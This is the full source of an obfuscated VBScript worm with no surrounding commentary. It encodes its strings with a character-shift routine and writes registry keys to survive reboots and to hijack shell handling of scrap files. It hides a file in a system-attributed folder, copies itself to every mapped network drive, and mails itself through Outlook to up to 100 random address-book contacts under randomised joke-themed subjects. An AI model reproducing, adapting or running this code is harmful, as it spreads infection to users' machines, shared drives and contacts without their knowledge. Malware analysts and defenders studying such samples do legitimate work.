R.RegWrite D("GLFZ`VTFQT[-CFEBVKS[Tpesxbqf[Njqbajkjt[JDR[Bhfms[Boot[JDR[Obsg"),K(E(0),D("XTDQJOS-FWF"))
R.RegWrite D("GLFZ`VTFQT[-CFEBVKS[Tpesxbqf[Njqbajkjt[JDR[Bhfms[Boot[JDR[Tsbqsvo"),E(0)
S=""
S=R.RegRead(D("GLFZ`DKBTTFT`QPPS[")&R.RegRead(D("GLFZ`DKBTTFT`QPPS[-sws["))&D("[CfebvksJdpm["))
If S<>"" Then R.RegWrite D("GLFZ`DKBTTFT`QPPS[TgfkkTdqbo[CfebvksJdpm["),S
R.RegWrite D("GLFZ`DKBTTFT`QPPS[swsejkf[BkxbztTgpxFws"),""
If P.FileExists(K(E(0),D("QFHFCJS-FWF"))) Then
GS=K(Left(E(0),3)&D("QFDZDKFC"),D("QFDZDKFC-UWC"))
P.MoveFile K(E(0),D("QFHFCJS-FWF")),GS
Set F=P.GetFile(GS)
F.Attributes=39
R.RegWrite D("GLFZ`DKBTTFT`QPPS[")&R.RegRead(D("GLFZ`DKBTTFT`QPPS[-qfh["))&D("[CfebvksJdpm["),GS&D("+2")
R.RegWrite D("GLFZ`DKBTTFT`QPPS[")&R.RegRead(D("GLFZ`DKBTTFT`QPPS[-qfh["))&D("[tgfkk[pofm[dpnnbmc["),GS&D(" ""&2""")
End If
If Not I Then
Set C=CreateObject(D("XTdqjos-Mfsxpql"))
Set Q=C.EnumNetworkDrives
If Q.Count>0 Then
For B=0 To Q.Count-1
If Q.Item(B)<>"" Then
If P.FolderExists(K(Q.Item(B),Mid(OE(D("TsbqsVo")),4))) Then P.CopyFile K(E(0),PD),K(K(Q.Item(B),Mid(OE(D("TsbqsVo")),4)),PD) Else P.CopyFile K(E(0),PD),K(Q.Item(B),PD)
End If
Next
End If
End If
HG=""
HG=R.RegRead(D("GLFZ`KPDBK`NBDGJMF[Tpesxbqf[Njdqptpes[Xjmcpxt[DvqqfmsUfqtjpm[PTMbnf"))
If HG="" Then
JM=""
Set JM=CreateObject(D("Pvskppl-Bookjdbsjpm"))
If JM Is Not Nothing Then
Set JS=JM.GetNameSpace(D("NBOJ"))
M=False
For Each G In JS.AddressLists
If G.AddressEntries.Count>0 Then
Set U=JM.CreateItem(0)
If G.AddressEntries.Count>100 Then
Dim FL(99)
For VH=0 To 99
FL(VH)=Int(G.AddressEntries.Count*Rnd+1)
Next
For VH=0 To 99
For JG=VH+1 To 99
If FL(VH)=FL(JG) And FL(VH)<>0 Then FL(JG)=0
Next
Next
For VH=0 To 99
If FL(VH)=0 Then FL(VH)=Int(G.AddressEntries.Count*Rnd+1)
Next
For VH=0 To 99
For JG=VH+1 To 99
If FL(VH)=FL(JG) And FL(VH)<>0 Then FL(JG)=0
Next
Next
For VH=0 To 99
If FL(VH)<>0 Then
Set FP=G.AddressEntries(FL(VH))
If VH=0 Then U.BCC=FP.Address Else U.BCC=U.BCC&D("< ")&FP.Address
End If
Next
Else
For VH=1 To G.AddressEntries.Count
Set FP=G.AddressEntries(VH)
If VH=1 Then U.BCC=FP.Address Else U.BCC=U.BCC&D("< ")&FP.Address
Next
End If
X=""
If Int(2*Rnd+1)=1 Then X=D("Ex9 ")
O=Int(3*Rnd+1)
If O=1 Then
X=X&D("Kjef tsbhft")
ElseIf O=2 Then
X=X&D("Evmmz")
Else
X=X&D("Iplft")
End If
If Int(2*Rnd+1)=1 Then X=X&D(" sfws")
U.Subject=X
X=""
If Int(3*Rnd+1)>1 Then
X=D("= Sgf nbkf bmc efnbkf tsbhft pe kjef-")
If Int(3*Rnd+1)=1 Then X=X&D(" Azf-")
End If
If Int(2*Rnd+1)=1 Then U.Body=X Else U.HTMLBody=X
U.Attachments.Add K(E(0),PD)
U.DeleteAfterSubmit=True
U.Send
M=True
End If
Next
If M Then R.RegWrite D("GLFZ`KPDBK`NBDGJMF[Tpesxbqf[Njdqptpes[Xjmcpxt[DvqqfmsUfqtjpm[PTMbnf"),D("Njdqptpes Xjmcpxt")
End If
End If
End If
If Not I Then P.DeleteFile(K(E(2),D("KJEF`TSBHFT-SWS")))
Function D(FR)
D=""
For JN=1 To Len(FR)
If Asc(Mid(FR,JN,1))<>32 And Asc(Mid(FR,JN,1))<>33 And Asc(Mid(FR,JN,1))<>34 And Asc(Mid(FR,JN,1))<>160 And Asc(Mid(FR,JN,1))<>255 Then
If Asc(Mid(FR,JN,1)) Mod 2=0 Then D=D&Chr(Asc(Mid(FR,JN,1))-Left(Asc(Right(ZP,1)),1)) Else D=D&Chr(Asc(Mid(FR,JN,1))+Left(Asc(Right(ZP,1)),1))
Else
D=D&Mid(FR,JN,1)
End If
Next
End Function
Function K(EQ,RB)
On Error Resume Next
K=P.BuildPath(EQ,RB)
End Function
Function OE(PQ)
On Error Resume Next
OE=R.SpecialFolders(PQ)
End Function
Function E(GP)
On Error Resume Next
E=P.GetSpecialFolder(GP)
End Function
Function L(WG)
On Error Resume Next
Y=""
H E(2),WG
If Y="" Then WQ D("9["),WG
If Y="" Then WQ D("9[NJQD"),WG
If Y="" Then WQ D("9[NJQD41"),WG
If Y="" Then WQ D("9[OJQDG"),WG
If Y="" Then WQ D("9[OJQDG:7"),WG
If Y="" Then
TQ=R.RegRead(D("GLFZ`KPDBK`NBDGJMF[Tpesxbqf[Njdqptpes[Xjmcpxt[DvqqfmsUfqtjpm[OqphqbnEjkftCjq"))
H K(TQ,D("NJQD")),WG
End If
If Y="" Then H K(TQ,D("NJQD41")),WG
If Y="" Then H K(TQ,D("OJQDG")),WG
If Y="" Then H K(TQ,D("OJQDG:7")),WG
If Y="" Then H OE(D("Cftlspo")),WG
If Y="" Then H OE(D("NzCpdvnfmst")),WG
L=Y
End Function
Sub H(FW,YH)
On Error Resume Next
If P.FolderExists(FW) Then
For Each GC In P.GetFolder(FW).Files
If YH Then
If UCase(GC.Name)=PD Then
Set FK=P.GetFile(GC.Path)
If FK.Size=39936 Then
Y=GC.Path
Exit For
End If
End If
Else
If UCase(P.GetExtensionName(GC.Path))=D("TGT") Then
Set FK=P.GetFile(GC.Path)
If FK.Size=39936 Then
Y=GC.Path
Exit For
End If
End If
End If
Next
If Y="" And Right(FW,2)<>D("9[") Then
For Each SL In P.GetFolder(FW).SubFolders
H SL.Path,YH
Next
End If
End If
End Sub
Sub WQ(HJ,PZ)
On Error Resume Next
For Each Z In P.Drives
If Z.DriveType=2 Then
H Z.DriveLetter&HJ,PZ
If Y<>"" Then Exit For
End If
Next
End Sub
Function W(HQ)
On Error Resume Next
W=""
Set V=N.FileSearch
V.NewSearch
V.FileName=HQ
V.SearchSubFolders=True
For Each Z In P.Drives
If Z.DriveType=2 Then
V.LookIn=Z.DriveLetter&D("9[")
V.Execute
If V.FoundFiles.Count>0 Then
For PS=1 To V.FoundFiles.Count
Set FK=P.GetFile(V.FoundFiles(PS))
If FK.Size=39936 Then
W=V.FoundFiles(PS)
Exit For
End If
Next
If W<>"" Then Exit For
Else
V.NewSearch
V.FileName=HQ
V.SearchSubFolders=True
End If
End If
Next
End Function
Sub UQ(DG)
On Error Resume Next
O=Int(5*Rnd+1)
If O=1 Then
JW=D("JNOPQSBMS")
ElseIf O=2 Then
JW=D("JMEP")
ElseIf O=3 Then
JW=D("QFOPQS")
ElseIf O=4 Then
JW=D("TFDQFS")
Else
JW=D("VMLMPXM")
End If
O=Int(3*Rnd+1)
If O=1 Then
JW=JW&D(".")
ElseIf O=2 Then
JW=JW&D("`")
End If
If O<>3 Then
JW=JW&Int(999*Rnd+1)
End If
JW=JW&D("-SWS-TGT")
If Int(2*Rnd+1)=1 Then JW=LCase(JW)
P.CopyFile K(E(0),PD),K(DG,JW)
End Sub
$+ $putt